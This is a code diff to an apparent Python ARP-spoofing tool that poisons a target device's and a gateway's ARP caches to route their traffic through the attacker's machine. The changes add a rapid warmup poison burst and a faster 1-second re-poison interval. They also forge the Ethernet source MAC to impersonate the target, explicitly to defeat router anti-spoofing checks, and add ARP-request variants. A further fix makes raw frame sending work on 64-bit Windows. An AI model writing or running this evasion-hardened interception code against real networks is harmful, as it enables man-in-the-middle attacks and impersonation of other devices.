@@ -68,17 +68,36 @@ __all__ = [
 
 _ETH_P_ARP = 0x0806
 _ARP_OP_REPLY = 2
+_ARP_OP_REQUEST = 1
 _ARP_HW_ETHER = 1
 _ETH_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 
 # ARP spoof interval — how often we re-poison the caches.
 # Needs to be frequent enough that the real gateway's own gratuitous
-# ARPs don't undo our spoofing.
-_SPOOF_INTERVAL_SEC = 2.0
+# ARPs don't undo our spoofing. Consumer routers typically refresh
+# their ARP caches every 30-60s, but endpoints (PS5) can age entries
+# faster under load. 1.0s gives us ~2x headroom vs the 2-5s Android/
+# iOS refresh cadence we've seen empirically, without flooding the
+# LAN with broadcast.
+_SPOOF_INTERVAL_SEC = 1.0
 
 # How many corrective ARP replies to send on cleanup.
 _RESTORE_ROUNDS = 5
 _RESTORE_INTERVAL_SEC = 0.3
+
+# Gratuitous ARP warmup: burst of unsolicited replies at start() to
+# force immediate cache overwrite instead of waiting for the target's
+# ARP entry TTL to expire. Without this, the first packet through the
+# pipeline can lag 10-30s while the target's cached gateway MAC ages
+# out. With burst=5, interval=0.1s, the target typically picks up the
+# poison within ~200ms of start.
+_WARMUP_ROUNDS = 5
+_WARMUP_INTERVAL_SEC = 0.1
+
+# Hoisted once at import time; platform.system() invokes uname() and
+# .lower() allocates a fresh string every call. Every `_IS_WINDOWS`
+# check below is O(1) rather than O(syscall).
+_IS_WINDOWS = platform.system().lower() == "windows"
 
 
 # ── Helpers: gateway / MAC discovery ─────────────────────────────────
@@ -89,7 +108,7 @@ def get_default_gateway() -> Optional[str]:
     Uses ``ipconfig`` on Windows, ``ip route`` on Linux.
     """
     try:
-        if platform.system().lower() == "windows":
+        if _IS_WINDOWS:
             return _gateway_windows()
         return _gateway_linux()
     except Exception as e:
@@ -162,7 +181,7 @@ def get_local_mac(target_ip: Optional[str] = None) -> Optional[str]:
     route interface.
     """
     try:
-        if platform.system().lower() == "windows":
+        if _IS_WINDOWS:
             return _local_mac_windows(target_ip)
         return _local_mac_linux(target_ip)
     except Exception as e:
@@ -242,7 +261,7 @@ def get_mac_for_ip(ip: str) -> Optional[bytes]:
         _ping_once(ip)
         time.sleep(0.15)
 
-        if platform.system().lower() == "windows":
+        if _IS_WINDOWS:
             return _mac_from_arp_windows(ip)
         return _mac_from_arp_linux(ip)
     except Exception as e:
@@ -253,7 +272,7 @@ def get_mac_for_ip(ip: str) -> Optional[bytes]:
 def _ping_once(ip: str) -> None:
     """Send a single ICMP echo to populate the ARP table."""
     try:
-        is_win = platform.system().lower() == "windows"
+        is_win = _IS_WINDOWS
         count_flag = "-n" if is_win else "-c"
         # Windows -w is in ms; Linux -W is in seconds
         timeout_flag = "-w" if is_win else "-W"
@@ -374,31 +393,52 @@ def _build_arp_reply(
     src_ip: str,
     dst_mac: bytes,
     dst_ip: str,
+    eth_src_mac: Optional[bytes] = None,
+    opcode: int = _ARP_OP_REPLY,
 ) -> bytes:
-    """Build a raw Ethernet frame containing an ARP reply.
+    """Build a raw Ethernet frame containing an ARP reply (or request).
 
-    The ARP reply tells *dst_ip* (at *dst_mac*) that *src_ip* has
+    The ARP payload tells *dst_ip* (at *dst_mac*) that *src_ip* has
     MAC address *src_mac*.  When *src_mac* is our laptop's MAC and
     *src_ip* is the gateway, this poisons the target's ARP cache.
 
+    Args:
+        src_mac: ARP sender hardware address (the MAC claim we want
+            the recipient to cache).
+        src_ip: ARP sender protocol address (the IP we're claiming
+            to own).
+        dst_mac: ARP target hardware address (the recipient's MAC).
+        dst_ip: ARP target protocol address (the recipient's IP).
+        eth_src_mac: Optional override for the Ethernet header's source
+            MAC. Defaults to ``src_mac``. Use this to **decouple** the
+            Ethernet source from the ARP sender — e.g., impersonate the
+            target's real MAC at the L2 level while still claiming to
+            be the target in the ARP payload at our_mac. Bypasses
+            consumer routers that correlate eth_src with ARP sender
+            and drop mismatched frames (common anti-spoof heuristic).
+        opcode: _ARP_OP_REPLY (default, unsolicited reply) or
+            _ARP_OP_REQUEST (1). Some routers ignore unsolicited
+            replies but cache the sender of an ARP request.
+
     Frame layout:
         Ethernet header (14 bytes):
-            dst_mac(6) + src_mac(6) + ethertype(2)
+            dst_mac(6) + eth_src_mac(6) + ethertype(2)
         ARP payload (28 bytes):
             hw_type(2) + proto_type(2) + hw_len(1) + proto_len(1) +
             opcode(2) + sender_mac(6) + sender_ip(4) + target_mac(6) +
             target_ip(4)
     """
+    _eth_src = eth_src_mac if eth_src_mac is not None else src_mac
     # Ethernet header
-    eth = dst_mac + src_mac + struct.pack("!H", _ETH_P_ARP)
+    eth = dst_mac + _eth_src + struct.pack("!H", _ETH_P_ARP)
 
-    # ARP reply
+    # ARP payload
     arp = struct.pack("!HHBBH",
                       _ARP_HW_ETHER,     # hardware type: Ethernet
                       0x0800,             # protocol type: IPv4
                       6,                  # hardware address length
                       4,                  # protocol address length
-                      _ARP_OP_REPLY)      # opcode: reply
+                      opcode)             # opcode: 2=reply, 1=request
 
     arp += src_mac                           # sender hardware address
     arp += socket.inet_aton(src_ip)          # sender protocol address
@@ -412,7 +452,7 @@ def _build_arp_reply(
 
 def _get_ip_forwarding_state() -> bool:
     """Check if Windows IP forwarding is enabled."""
-    if platform.system().lower() != "windows":
+    if not _IS_WINDOWS:
         try:
             with open("/proc/sys/net/ipv4/ip_forward") as f:
                 return f.read().strip() == "1"
@@ -440,7 +480,7 @@ def _set_ip_forwarding(enable: bool) -> bool:
     On Windows uses ``netsh`` (requires admin).
     On Linux writes to ``/proc/sys/net/ipv4/ip_forward``.
     """
-    if platform.system().lower() != "windows":
+    if not _IS_WINDOWS:
         try:
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("1" if enable else "0")
@@ -478,7 +518,7 @@ def _get_raw_socket() -> Optional[socket.socket]:
 
     Returns a socket-like object or None on failure.
     """
-    if platform.system().lower() != "windows":
+    if not _IS_WINDOWS:
         try:
             # Linux: AF_PACKET raw socket
             s = socket.socket(
@@ -511,11 +551,20 @@ class NpcapSender:
 
     def __init__(self) -> None:
         self._pcap: Optional[ctypes.CDLL] = None
-        self._handle: Optional[ctypes.c_void_p] = None
+        # pcap_open_live returns c_void_p, which ctypes surfaces as
+        # Optional[int] (None = null pointer, int = opaque handle).
+        self._handle: Optional[int] = None
         self._loaded = False
 
     def load(self) -> bool:
-        """Load the Npcap/WinPcap DLL."""
+        """Load the Npcap/WinPcap DLL and set ctypes signatures.
+
+        CRITICAL: every pcap_* function must have argtypes and restype
+        declared. Without this, ctypes defaults restype to c_int (32-bit),
+        which truncates the 64-bit pcap_t* pointer returned by
+        pcap_open_live. The truncated handle then causes an access
+        violation when passed to pcap_sendpacket.
+        """
         if self._loaded:
             return True
 
@@ -526,11 +575,45 @@ class NpcapSender:
         ):
             try:
                 self._pcap = ctypes.CDLL(path)
-                self._loaded = True
-                log_info(f"Npcap/WinPcap loaded from {path}")
-                return True
             except OSError:
                 continue
+
+            # Declare signatures so pointers survive the FFI boundary
+            # on 64-bit Windows.
+            try:
+                self._pcap.pcap_open_live.argtypes = [
+                    ctypes.c_char_p,   # device
+                    ctypes.c_int,      # snaplen
+                    ctypes.c_int,      # promisc
+                    ctypes.c_int,      # to_ms
+                    ctypes.c_char_p,   # errbuf
+                ]
+                self._pcap.pcap_open_live.restype = ctypes.c_void_p
+
+                self._pcap.pcap_sendpacket.argtypes = [
+                    ctypes.c_void_p,   # pcap_t*
+                    ctypes.c_char_p,   # buf
+                    ctypes.c_int,      # size
+                ]
+                self._pcap.pcap_sendpacket.restype = ctypes.c_int
+
+                self._pcap.pcap_close.argtypes = [ctypes.c_void_p]
+                self._pcap.pcap_close.restype = None
+
+                # findalldevs / freealldevs: leave argtypes unset so
+                # _find_interface can pass ctypes.byref(alldevsp) against
+                # a locally-defined pcap_if struct without conversion
+                # conflicts. Only restype matters for correctness here.
+                self._pcap.pcap_findalldevs.restype = ctypes.c_int
+                self._pcap.pcap_freealldevs.restype = None
+            except AttributeError as e:
+                log_error(f"Npcap DLL at {path} missing expected symbols: {e}")
+                self._pcap = None
+                continue
+
+            self._loaded = True
+            log_info(f"Npcap/WinPcap loaded from {path}")
+            return True
 
         log_error(
             "Npcap/WinPcap not found. Install Npcap (https://npcap.com) "
@@ -760,7 +843,7 @@ class ArpSpoofer:
                 return False
 
         # 3. Open sender
-        if platform.system().lower() == "windows":
+        if _IS_WINDOWS:
             self._sender = NpcapSender()
             if not self._sender.load():
                 self._restore_forwarding()
@@ -792,9 +875,21 @@ class ArpSpoofer:
             except Exception as e:
                 log_error(f"Linux ARP socket bind failed: {e}")
 
-        # 4. Send initial poison burst and start loop
+        # 4. Send initial poison burst and start loop.
+        # Gratuitous ARP warmup — blast _WARMUP_ROUNDS replies at
+        # _WARMUP_INTERVAL_SEC spacing so target + gateway both
+        # overwrite their caches immediately, killing the cold-start
+        # delay where the first real packet doesn't arrive until the
+        # stale ARP entry ages out (can be 10-30s on some devices).
         self._running = True
-        self._poison_once()
+        for i in range(_WARMUP_ROUNDS):
+            self._poison_once()
+            if i < _WARMUP_ROUNDS - 1:
+                time.sleep(_WARMUP_INTERVAL_SEC)
+        log_info(
+            f"ArpSpoofer: warmup burst sent "
+            f"({_WARMUP_ROUNDS} rounds @ {_WARMUP_INTERVAL_SEC}s)"
+        )
 
         self._thread = threading.Thread(
             target=self._poison_loop,
@@ -882,13 +977,31 @@ class ArpSpoofer:
         self._send_frame(frame_to_target)
 
         # Tell gateway: "target_ip is at our_mac"
+        # MAC-spoof spike: L2 Ethernet source = target's real MAC, but
+        # ARP payload sender = our MAC. Defeats consumer routers that
+        # correlate eth_src with ARP sender and drop mismatched frames
+        # (common anti-spoof heuristic on ASUS/Netgear/Ubiquiti gear).
         frame_to_gateway = _build_arp_reply(
             src_mac=self._local_mac,
             src_ip=self.target_ip,
             dst_mac=self._gateway_mac,
             dst_ip=self.gateway_ip,
+            eth_src_mac=self._target_mac,
         )
         self._send_frame(frame_to_gateway)
+
+        # Second variant: ARP request (opcode=1) instead of reply.
+        # Some routers only update their cache on requests, ignoring
+        # unsolicited replies entirely (RFC 826 strict mode).
+        frame_to_gateway_req = _build_arp_reply(
+            src_mac=self._local_mac,
+            src_ip=self.target_ip,
+            dst_mac=self._gateway_mac,
+            dst_ip=self.gateway_ip,
+            eth_src_mac=self._target_mac,
+            opcode=_ARP_OP_REQUEST,
+        )
+        self._send_frame(frame_to_gateway_req)
 
     def _poison_loop(self) -> None:
         """Background thread: re-poison ARP caches every N seconds."""
